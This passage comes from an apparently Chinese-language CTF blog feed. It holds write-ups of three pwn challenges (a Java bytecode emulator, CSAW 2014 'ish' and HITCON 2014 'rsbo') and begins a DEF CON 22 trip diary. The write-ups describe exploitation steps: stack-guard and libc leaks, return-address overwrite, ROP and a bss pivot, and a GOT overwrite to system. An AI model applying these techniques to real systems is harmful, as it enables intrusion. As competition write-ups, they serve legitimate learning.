還包含了一些 libary function&lt;br&gt;
程式規模非常大 要每個 function 都看過不太可能  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;main&lt;/code&gt; 非常簡單&lt;br&gt;
進行 io redirect 和一些參數的檢查&lt;br&gt;
接著就進入兩個關鍵的 function&lt;br&gt;
&lt;code&gt;parse_file_or_die()&lt;/code&gt; 以及 &lt;code&gt;gogo()&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;這兩個 function 都十分複雜&lt;br&gt;
而且又用了不少動態跳躍&lt;br&gt;
即使用 ida pro 翻成 pseudo code 也不完整&lt;br&gt;
很難完全看懂&lt;br&gt;
用動態分析其行為得到結果是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;parse_file_or_die()&lt;/code&gt;
    讀入一個 java class，如果格式有誤或者使用了不允許的動作都會發生 exception 並結束 …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;這題看了十個小時多卻沒解出來&lt;br&gt;
實在是很挫敗......&lt;br&gt;
不過還是覺得這題該寫個 write up 紀錄&lt;br&gt;
下次才不會一樣進入思維誤區  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;這題是 binary 是用 C++ 寫的&lt;br&gt;
還包含了一些 libary function&lt;br&gt;
程式規模非常大 要每個 function 都看過不太可能  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;main&lt;/code&gt; 非常簡單&lt;br&gt;
進行 io redirect 和一些參數的檢查&lt;br&gt;
接著就進入兩個關鍵的 function&lt;br&gt;
&lt;code&gt;parse_file_or_die()&lt;/code&gt; 以及 &lt;code&gt;gogo()&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;這兩個 function 都十分複雜&lt;br&gt;
而且又用了不少動態跳躍&lt;br&gt;
即使用 ida pro 翻成 pseudo code 也不完整&lt;br&gt;
很難完全看懂&lt;br&gt;
用動態分析其行為得到結果是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;parse_file_or_die()&lt;/code&gt;
    讀入一個 java class，如果格式有誤或者使用了不允許的動作都會發生 exception 並結束&lt;/li&gt;
&lt;li&gt;&lt;code&gt;gogo()&lt;/code&gt;
    逐步執行 bytecode，如果使用沒有實作的指令或是使用 mnemonic 有問題，就跳出 exception 並結束&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以這題是個 java emulator&lt;br&gt;
一開始以為這題是 jailbreak 的類型&lt;br&gt;
一直在想辦法繞過 &lt;code&gt;parse_file_or_die()&lt;/code&gt; 的限制去讀 flag&lt;br&gt;
但是這個方向顯然是錯的&lt;br&gt;
直到官方放出了 &lt;code&gt;libc-2.19.so&lt;/code&gt; 才把方向轉為尋找漏洞...&lt;br&gt;
這邊犯下了第一個錯誤－－太執著於靜態分析&lt;br&gt;
花了很多時間在看 &lt;code&gt;parse_file_or_die()&lt;/code&gt;&lt;br&gt;
直到 Lays 發現寫 bytecode 使用數個 &lt;code&gt;ldc&lt;/code&gt; 會導致程式 smash tht stack&lt;br&gt;
才確定 vuln 在 &lt;code&gt;gogo()&lt;/code&gt; =__=  &lt;/p&gt;
&lt;p&gt;有了 crash 點就很輕易能找出程式是哪裡出問題 (fault localization?)&lt;br&gt;
逐步追蹤可以找到 crash 的原因在呼叫 &lt;code&gt;Stack::push()&lt;/code&gt; 會 overflow&lt;br&gt;
後來又發現 istore 算好 offset 可以改到 eip 的 value&lt;br&gt;
但由於一次寫入會是 16 byte (tag + value)&lt;br&gt;
tag 值無法控制...也就是說無法控制連續的 stack&lt;br&gt;
只能做一次 return&lt;br&gt;
沒有辦法成功構造出 rop 去 leak information 再跳到 system&lt;br&gt;
嘗試找 gadget 來解決 stack layout 的問題&lt;br&gt;
經過三小時的嘗試後宣告這方向似乎是錯的....&lt;br&gt;
開始把方向轉到尋找可用的 bytecode&lt;br&gt;
但是時間已經不夠了 Q__Q  &lt;/p&gt;
&lt;p&gt;後來花點時間把程式完全看懂&lt;br&gt;
這題的問題是這樣子的.....&lt;br&gt;
(後面 &lt;strong&gt;小寫 stack&lt;/strong&gt; 表示 elf 的 stack、&lt;strong&gt;大寫 Stack&lt;/strong&gt; 表示 jvm 模擬的 stack)  &lt;/p&gt;
&lt;p&gt;這題在初始化 jvm 的環境後&lt;br&gt;
將一些參數 push 進 Stack&lt;br&gt;
就開始執行 java main function 的 bytecode&lt;br&gt;
接著可以使用 bytecode 操作 Stack 的指令去控制 stack&lt;br&gt;
這題的 Stack 並不是使用 C++ 的 standard library 寫的&lt;br&gt;
而是出題者自已寫的 Stack 物件&lt;br&gt;
導致可以 overflow 以及修改 stack 的內容&lt;br&gt;
push 的單位是一個 &lt;code&gt;StackItem&lt;/code&gt; = 16 byte&lt;br&gt;
但也造成前面提到的不能連續控制記憶體的問題  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;struct StackItem
{
    int tag;
    int value;
};
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;ldc [value or str]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sipush [value]&lt;/code&gt;&lt;br&gt;
    兩個指令類似，在 Stack push StackItem&lt;/li&gt;
&lt;li&gt;&lt;code&gt;istore [offset]&lt;/code&gt;
    在 Stack + offset 的位置寫 StackItem&lt;/li&gt;
&lt;li&gt;&lt;code&gt;iload [offset]&lt;/code&gt;
    在 Stack + offset 的位置 pop StackItem，檢查 StackItem.tag 的值是不是 0x2f，如果是就 push 進 Stack&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;理論上 &lt;code&gt;iload&lt;/code&gt; 做 &lt;code&gt;0x2f&lt;/code&gt; 的檢查以後沒辦法任意讀取記憶體內容&lt;br&gt;
但是這邊其實是有問題的&lt;br&gt;
原因是 Stack 的內容並沒有對齊 16 byte  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mh"&gt;0xffffd020&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;     &lt;span class="mh"&gt;0x0000005e&lt;/span&gt;      &lt;span class="mh"&gt;0x08065188&lt;/span&gt;      &lt;span class="mh"&gt;0xffffd034&lt;/span&gt;      &lt;span class="mh"&gt;0x0805305c&lt;/span&gt;
&lt;span class="mh"&gt;0xffffd030&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;     &lt;span class="mh"&gt;0x080650f8&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;
&lt;span class="mh"&gt;0xffffd040&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;     &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;
&lt;span class="mh"&gt;0xffffd050&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;     &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;
&lt;span class="mh"&gt;0xffffd060&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;     &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0000002f&lt;/span&gt;      &lt;span class="mh"&gt;0x0eceea00&lt;/span&gt;      &lt;span class="o"&gt;&amp;lt;--&lt;/span&gt; &lt;span class="n"&gt;stack&lt;/span&gt; &lt;span class="n"&gt;guard&lt;/span&gt;
&lt;span class="mh"&gt;0xffffd070&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;     &lt;span class="mh"&gt;0xffffd080&lt;/span&gt;      &lt;span class="mh"&gt;0x00000000&lt;/span&gt;      &lt;span class="mh"&gt;0xffffd128&lt;/span&gt;      &lt;span class="mh"&gt;0x08054180&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;ldc 0x2f&lt;/code&gt; push 大量的 0x2f 進入 Stack&lt;br&gt;
&lt;code&gt;iload&lt;/code&gt; 是按照 &lt;code&gt;[Stack + offset\*8]&lt;/code&gt; 的方式去存取 Stack&lt;br&gt;
如果把 push 的內容就是 0x2f 就可以 bypass &lt;code&gt;iload&lt;/code&gt; 的 檢查&lt;br&gt;
因此我們可以順利得到 stack 上的內容&lt;br&gt;
以此例來說，&lt;code&gt;iload&lt;/code&gt; 得到的結果是 stack guard&lt;br&gt;
用同樣的方式可以得到出 &lt;code&gt;libc&lt;/code&gt; 的位置  &lt;/p&gt;
&lt;p&gt;嚴格來說，這樣並沒有成功 leak memory&lt;br&gt;
因為不會 print 出來，我們也沒辦法再接 io&lt;br&gt;
但是這題也不需要&lt;br&gt;
用 &lt;code&gt;iload&lt;/code&gt; 得到 libc 以後可以直接用 bytecode 提供的指令做運算&lt;br&gt;
算出 &lt;code&gt;system&lt;/code&gt; 的位置，再用 &lt;code&gt;istore&lt;/code&gt; 重新寫回 stack  &lt;/p&gt;
&lt;p&gt;總結這題的做法如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;iload&lt;/code&gt; 得到 stack guard  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;iload&lt;/code&gt; 得到 libc address  &lt;/li&gt;
&lt;li&gt;利用 &lt;code&gt;sipush&lt;/code&gt;、&lt;code&gt;iadd&lt;/code&gt;、&lt;code&gt;isub&lt;/code&gt; 等做運算得到 &lt;code&gt;system&lt;/code&gt;、&lt;code&gt;/bin/sh&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;istore&lt;/code&gt; 改寫 ret address 以及參數  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;istore&lt;/code&gt; 將被更動的 stack guard 寫回  &lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;經過這題才發現自己的思維很狹隘&lt;br&gt;
執著於過去學到的 rop 走入誤區&lt;br&gt;
一直想著如何 leak address&lt;br&gt;
卻沒想到可以利用 java 本身做運算&lt;br&gt;
紀錄此篇 write up&lt;br&gt;
希望以後不會犯下同樣的錯誤  &lt;/p&gt;</content><category term="Other CTF"></category><category term="VM Executable"></category></entry><entry><title>CSAW CTF 2014 pwn 300 ish</title><link href="https://ddaa.tw/csawctf_pwn_300_ish.html" rel="alternate"></link><published>2014-09-23T09:23:00+08:00</published><updated>2014-09-23T09:23:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-09-23:/csawctf_pwn_300_ish.html</id><summary type="html">&lt;p&gt;接觸 CTF 一年整了...&lt;br&gt;
好像進步很多 卻又好像什麼都一樣 (嘆&lt;br&gt;
最後 400 分體力不支了&lt;br&gt;
隔天才解出有點可惜 QQ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;ish&lt;/em&gt; 是一個模擬 shell 的程式&lt;br&gt;
有以下幾個指令：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;ls&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;cat&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;ping&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;admin&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;login&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;run&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;sleep&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;lotto&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;quote&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;run&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;exit&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;把程式都看過一遍以後&lt;br&gt;
比較可疑的有 &lt;em&gt;cat&lt;/em&gt;、&lt;em&gt;run&lt;/em&gt;、&lt;em&gt;login&lt;/em&gt;、&lt;em&gt;lotto&lt;/em&gt;&lt;br&gt;
其他都毫無意義  &lt;/p&gt;
&lt;p&gt;&lt;em&gt;cat&lt;/em&gt; 會去開一個檔案&lt;br&gt;
但是開啟參數有問題&lt;br&gt;
檔案不存在就會生一個出來...已存在就會回傳錯誤直接 return  &lt;/p&gt;
&lt;p&gt;&lt;em&gt;run&lt;/em&gt; 是把指令切割後&lt;br&gt;
第一個參數丟到 &lt;code&gt;system&lt;/code&gt; 呼叫&lt;br&gt;
不過第一個參數一定是 &lt;em&gt;run&lt;/em&gt;...&lt;br&gt;
依然無法利用  &lt;/p&gt;
&lt;p&gt;&lt;em&gt;login&lt;/em&gt; 會再開一次 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;接觸 CTF 一年整了...&lt;br&gt;
好像進步很多 卻又好像什麼都一樣 (嘆&lt;br&gt;
最後 400 分體力不支了&lt;br&gt;
隔天才解出有點可惜 QQ  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;em&gt;ish&lt;/em&gt; 是一個模擬 shell 的程式&lt;br&gt;
有以下幾個指令：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;ls&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;cat&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;ping&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;admin&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;login&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;run&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;sleep&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;lotto&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;quote&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;run&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;exit&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;把程式都看過一遍以後&lt;br&gt;
比較可疑的有 &lt;em&gt;cat&lt;/em&gt;、&lt;em&gt;run&lt;/em&gt;、&lt;em&gt;login&lt;/em&gt;、&lt;em&gt;lotto&lt;/em&gt;&lt;br&gt;
其他都毫無意義  &lt;/p&gt;
&lt;p&gt;&lt;em&gt;cat&lt;/em&gt; 會去開一個檔案&lt;br&gt;
但是開啟參數有問題&lt;br&gt;
檔案不存在就會生一個出來...已存在就會回傳錯誤直接 return  &lt;/p&gt;
&lt;p&gt;&lt;em&gt;run&lt;/em&gt; 是把指令切割後&lt;br&gt;
第一個參數丟到 &lt;code&gt;system&lt;/code&gt; 呼叫&lt;br&gt;
不過第一個參數一定是 &lt;em&gt;run&lt;/em&gt;...&lt;br&gt;
依然無法利用  &lt;/p&gt;
&lt;p&gt;&lt;em&gt;login&lt;/em&gt; 會再開一次 shell&lt;br&gt;
檢查帳號是不是 &lt;em&gt;root&lt;/em&gt;&lt;br&gt;
是的話就會要求密碼&lt;br&gt;
並從 &lt;em&gt;key&lt;/em&gt; 這個檔案讀 64 byte 後並比對&lt;br&gt;
但是如果密碼長度超過 64 byte&lt;br&gt;
&lt;code&gt;memset&lt;/code&gt; 不會被觸發到&lt;br&gt;
密碼會被留在 stack 中  &lt;/p&gt;
&lt;p&gt;&lt;em&gt;lotto&lt;/em&gt; 有 &lt;strong&gt;uninitialized varaible&lt;/strong&gt; 造成的 memory leak&lt;br&gt;
可惜是用 &lt;code&gt;%u&lt;/code&gt; 去印&lt;br&gt;
沒辦法自由調整位置  &lt;/p&gt;
&lt;p&gt;這樣看完思路就很明確了&lt;br&gt;
利用 &lt;em&gt;login&lt;/em&gt; + &lt;em&gt;lotto&lt;/em&gt; 去 leak 出 flag&lt;br&gt;
而且出題者還很好心在這兩個 function 一開始 print 出 variable 的位置 = =  &lt;/p&gt;
&lt;p&gt;雖然很快就找到方向&lt;br&gt;
這題還是卡了一段時間.....&lt;br&gt;
如果照正常的順序開一個 shell 再執行 &lt;code&gt;lotto&lt;/code&gt;&lt;br&gt;
能 leak 的位置剛好在 &lt;code&gt;flag[64]&lt;/code&gt; 結束&lt;br&gt;
剛好是 &lt;strong&gt;stack guard&lt;/strong&gt; ...&lt;br&gt;
試了各種指令的組合也沒辦法調整 &lt;code&gt;esp&lt;/code&gt;&lt;br&gt;
一度以為這題是 bof = =  &lt;/p&gt;
&lt;p&gt;最後逐步比對 assembly&lt;br&gt;
才發現問題出在 &lt;em&gt;alloca&lt;/em&gt; 這個 function&lt;br&gt;
一開始以為這個指令是和 &lt;code&gt;malloc&lt;/code&gt; 類似&lt;br&gt;
但 &lt;code&gt;alloca&lt;/code&gt; 是會在 stack 中把 esp 的位置向上拉來增加空間&lt;br&gt;
再把新的 esp 回傳&lt;br&gt;
因此可以利用這個指令來調整 &lt;em&gt;lotto&lt;/em&gt; 所 leak 出的位置  &lt;/p&gt;
&lt;p&gt;所以只要透過調整 &lt;code&gt;uname&lt;/code&gt; 的長度來控制 stack&lt;br&gt;
就可以 leak &lt;em&gt;lotto&lt;/em&gt; 之前的任意 address 了&lt;br&gt;
觸發順序如下:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;em&gt;login with short uname&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;login with root&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;exit&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;login with long uname&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;lotto&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;flag: &lt;code&gt;AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMOOOOXX&lt;/code&gt;  &lt;/p&gt;</content><category term="CSAWCTF"></category><category term="Uninitialized"></category></entry><entry><title>HITCON CTF 2014 pwn 150 rsbo</title><link href="https://ddaa.tw/hitcon_pwn_150_rsbo.html" rel="alternate"></link><published>2014-08-18T23:01:00+08:00</published><updated>2014-08-18T23:01:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-08-18:/hitcon_pwn_150_rsbo.html</id><summary type="html">&lt;p&gt;這題是 32 bit 的 elf&lt;br&gt;
程式規模很小&lt;br&gt;
很容易就看完了  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;試一下超長字串就發現程式會 crash&lt;br&gt;
仔細看是因為 &lt;code&gt;read_80_bytes()&lt;/code&gt; buffer overflow&lt;br&gt;
buffer 長度 80 實際讀入 0x80 ...&lt;br&gt;
我一開始的確沒注意 XDD  &lt;/p&gt;
&lt;p&gt;crash 的原因是因為 ret 被蓋掉&lt;br&gt;
蓋完 ret 以後還有 16 byte 的長度可以利用&lt;br&gt;
這題有 dep + ASLR 的保護&lt;br&gt;
所以沒辦法知道要跳到哪&lt;br&gt;
此外，輸入的內容會隨機被打亂&lt;br&gt;
我們沒辦法讓 ret 正確變成我們希望的內容  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;size = read_80_bytes(buf);
for ( i = 0; i &amp;lt; size; ++i )
{
    v3 …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;這題是 32 bit 的 elf&lt;br&gt;
程式規模很小&lt;br&gt;
很容易就看完了  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;試一下超長字串就發現程式會 crash&lt;br&gt;
仔細看是因為 &lt;code&gt;read_80_bytes()&lt;/code&gt; buffer overflow&lt;br&gt;
buffer 長度 80 實際讀入 0x80 ...&lt;br&gt;
我一開始的確沒注意 XDD  &lt;/p&gt;
&lt;p&gt;crash 的原因是因為 ret 被蓋掉&lt;br&gt;
蓋完 ret 以後還有 16 byte 的長度可以利用&lt;br&gt;
這題有 dep + ASLR 的保護&lt;br&gt;
所以沒辦法知道要跳到哪&lt;br&gt;
此外，輸入的內容會隨機被打亂&lt;br&gt;
我們沒辦法讓 ret 正確變成我們希望的內容  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;size = read_80_bytes(buf);
for ( i = 0; i &amp;lt; size; ++i )
{
    v3 = rand();
    v7 = v3 % (i + 1);
  v6 = buf[i];
  buf[i] = buf[v3 % (i + 1)];
  buf[v7] = v6;
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;前面還有一個 &lt;code&gt;init()&lt;/code&gt; 去讀 flag 並隨機做 xor 後當成 rand seed&lt;br&gt;
不過最後計算過程中的 buf 會被清空&lt;br&gt;
完全無法利用  &lt;/p&gt;
&lt;p&gt;後來無意間發現 &lt;code&gt;size&lt;/code&gt; 和 &lt;code&gt;i&lt;/code&gt; 的值會被覆蓋&lt;br&gt;
但是有做初始化所以用不上&lt;br&gt;
可是如果我們將所有 buffer 都塞成 &lt;code&gt;\x00&lt;/code&gt; 會發生什麼事呢?&lt;br&gt;
如果在交換過程中 &lt;code&gt;size&lt;/code&gt; 與其他 byte 做交換&lt;br&gt;
只要 &lt;code&gt;size&lt;/code&gt; 所代表的 4 個 byte 都被換掉&lt;br&gt;
&lt;code&gt;size&lt;/code&gt; 的值就會變成 0&lt;br&gt;
迴圈因此中止&lt;br&gt;
扣掉 &lt;code&gt;size&lt;/code&gt; 和 &lt;code&gt;i&lt;/code&gt; 以後&lt;br&gt;
因此我們會有 20 byte 可以利用&lt;br&gt;
此時就可以開始利用 ROP 做點事情  &lt;/p&gt;
&lt;p&gt;如果沒有 ASLR 的保護我們可以直接透過 &lt;code&gt;return to libc&lt;/code&gt; 去拿到 shell&lt;br&gt;
&lt;strong&gt;可惜世界上總是很多事情沒有如果...&lt;/strong&gt;&lt;br&gt;
所以我們必須先想辦法讓程式 memory leak&lt;br&gt;
這樣一來 20 byte 就完全不夠用了...&lt;br&gt;
所以我們可以 ret 到 &lt;code&gt;read_80_bytes&lt;/code&gt; 來讀取更多的內容&lt;br&gt;
不直接跳到 &lt;code&gt;read&lt;/code&gt; 是為了省下參數空間  &lt;/p&gt;
&lt;p&gt;btw, 因為暫存的 &lt;code&gt;ebp&lt;/code&gt; 會被覆蓋&lt;br&gt;
執行到 &lt;code&gt;leave&lt;/code&gt; 時會改變 &lt;code&gt;esp&lt;/code&gt;&lt;br&gt;
在讀完額外的 80 byte 時&lt;br&gt;
我們將內容讀到 bss segment 上&lt;br&gt;
並且將 &lt;code&gt;ebp&lt;/code&gt; 蓋成 bss 的位置&lt;br&gt;
第二階段的 rop chain 都改放在 bss 上  &lt;/p&gt;
&lt;p&gt;最後只要隨便找個 got 上有的 function&lt;br&gt;
把內容改成 &lt;code&gt;system&lt;/code&gt; 的位置&lt;br&gt;
在 cat flag 就得到結果了  &lt;/p&gt;
&lt;p&gt;flag: &lt;code&gt;HITCON{Y0ur rand0m pay1oad s33ms w0rk, 1uckv 9uy}&lt;/code&gt;&lt;/p&gt;</content><category term="HITCON CTF"></category><category term="Stack Overflow"></category></entry><entry><title>DEF CON 22 CTF Final summary</title><link href="https://ddaa.tw/defcon_other_summary.html" rel="alternate"></link><published>2014-08-13T18:34:00+08:00</published><updated>2014-08-13T18:34:00+08:00</updated><author><name>ddaa</name></author><id>tag:ddaa.tw,2014-08-13:/defcon_other_summary.html</id><summary type="html">&lt;p&gt;&lt;strong&gt;===WARNING===&lt;/strong&gt;
這篇文章廢話超多......&lt;br&gt;
若要看比賽細節請直接跳至 &lt;strong&gt;8/8&lt;/strong&gt;  &lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;8/5&lt;/h2&gt;
&lt;hr&gt;
&lt;p&gt;必須說這次的出國真的很刺激&lt;br&gt;
首先是 orange 的簽證填錯護照號碼 XD&lt;br&gt;
過安檢的時候 jery 背包的一堆給溪都被丟掉了&lt;br&gt;
到 SFO 之後 sean 和 jery 過海關時不知為何被攔下&lt;br&gt;
好險長榮的工作人員去解圍&lt;br&gt;
經過一番波折終於抵達 las vegas&lt;br&gt;
在搭機場到飯店的接駁車上&lt;br&gt;
深深為 strip 的夜景感到驚豔  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;TT: 就是 unix 那個 strip  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;可惜相機還放在行李箱裡 Orz&lt;br&gt;
抵達飯店 RIO 以後跟 GD 會合&lt;br&gt;
在等待 checkin 的時間把一樓賭場逛了逛&lt;br&gt;
有種劉姥姥進大觀園的感覺~&lt;br&gt;
回飯店放完行李就出發覓食&lt;br&gt;
最後吃了漢堡王...好貴&lt;br&gt;
不過份量也很大 …&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;strong&gt;===WARNING===&lt;/strong&gt;
這篇文章廢話超多......&lt;br&gt;
若要看比賽細節請直接跳至 &lt;strong&gt;8/8&lt;/strong&gt;  &lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;8/5&lt;/h2&gt;
&lt;hr&gt;
&lt;p&gt;必須說這次的出國真的很刺激&lt;br&gt;
首先是 orange 的簽證填錯護照號碼 XD&lt;br&gt;
過安檢的時候 jery 背包的一堆給溪都被丟掉了&lt;br&gt;
到 SFO 之後 sean 和 jery 過海關時不知為何被攔下&lt;br&gt;
好險長榮的工作人員去解圍&lt;br&gt;
經過一番波折終於抵達 las vegas&lt;br&gt;
在搭機場到飯店的接駁車上&lt;br&gt;
深深為 strip 的夜景感到驚豔  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;TT: 就是 unix 那個 strip  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;可惜相機還放在行李箱裡 Orz&lt;br&gt;
抵達飯店 RIO 以後跟 GD 會合&lt;br&gt;
在等待 checkin 的時間把一樓賭場逛了逛&lt;br&gt;
有種劉姥姥進大觀園的感覺~&lt;br&gt;
回飯店放完行李就出發覓食&lt;br&gt;
最後吃了漢堡王...好貴&lt;br&gt;
不過份量也很大&lt;br&gt;
大家對蘑菇醬很有話題...XDD&lt;br&gt;
&lt;img alt="IMG_1733.JPG" src="http://user-image.logdown.io/user/6149/blog/6156/post/220500/WBrjgcYzQoSJ7dOIROZK_IMG_1733.JPG"&gt;&lt;/p&gt;
&lt;p&gt;吃完去賭場逛逛&lt;br&gt;
大家玩了幾次吃角子老虎&lt;br&gt;
輸一點小錢就回房間洗洗睡&lt;br&gt;
因為網路要另外收錢 = =&lt;br&gt;
順便抱怨飯店的提供的肥皂和洗髮精真的很難用&lt;br&gt;
我有點皮膚過敏的反應 orz&lt;br&gt;
&lt;img alt="IMG_1734.JPG" src="http://user-image.logdown.io/user/6149/blog/6156/post/220500/lE6XqYfnTeuUtH8tPf4Y_IMG_1734.JPG"&gt;  &lt;/p&gt;
&lt;h2&gt;8/6&lt;/h2&gt;
&lt;hr&gt;
&lt;p&gt;如果不算昨天，今天是到 las vegas 的第一天&lt;br&gt;
其實感覺不到什麼時差&lt;br&gt;
睡到大約九點&lt;br&gt;
發現 jeffxx 等人早就起床去吃過早餐了&lt;br&gt;
其他人也就集合下去吃&lt;br&gt;
一部分的人吃 starbucks&lt;br&gt;
其他人又去吃漢堡王 XDD&lt;br&gt;
starbucks 好貴 ...&lt;br&gt;
$11 ... 應該是我生平吃過最貴的早餐了  &lt;/p&gt;
&lt;p&gt;吃完早餐有些人就回去調時差&lt;br&gt;
其他人各自做自己的事情&lt;br&gt;
等到下午大家開始整合事前準備&lt;br&gt;
由於賽前無法得知規則及環境&lt;br&gt;
大家盡可能的推演各種狀況&lt;br&gt;
並分成 &lt;strong&gt;wrapper&lt;/strong&gt; 和 &lt;strong&gt;script&lt;/strong&gt; 兩組&lt;br&gt;
分配工作給大家&lt;br&gt;
兩組的工作主要有：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;wrapper (seau jery peter shik lucas)&lt;/li&gt;
&lt;li&gt;pty&lt;/li&gt;
&lt;li&gt;socket&lt;/li&gt;
&lt;li&gt;ld_preload &lt;/li&gt;
&lt;li&gt;ptrace&lt;/li&gt;
&lt;li&gt;script (orange jeffxx atdog dm4 and me)&lt;/li&gt;
&lt;li&gt;backdoor&lt;/li&gt;
&lt;li&gt;backup token &amp;amp; log&lt;/li&gt;
&lt;li&gt;monitor dir, port, ... etc&lt;/li&gt;
&lt;li&gt;parse pcap&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;除此之外還有模擬 gamebox 環境&lt;br&gt;
由 orange 和 jery 負責&lt;br&gt;
討論完後大家就各自工作&lt;br&gt;
其餘的時間除了吃 buffet 以外&lt;br&gt;
就是各自工作&lt;br&gt;
buffet 味道還不錯&lt;br&gt;
不過柳橙汁超酸&lt;br&gt;
中途大家要發表一下賽前心得...&lt;br&gt;
超難的 我已經不記得自己講什麼了 = =&lt;br&gt;
吃完原本打算去賭場浪費 $$&lt;br&gt;
結果才坐下來就被保安檢查&lt;br&gt;
我沒帶證件就被趕回房間了 QQ&lt;br&gt;
把一些 script 做細微修改&lt;br&gt;
剩下的時間研究去年 blue-lotus 的心得和去年 defcon 規則&lt;br&gt;
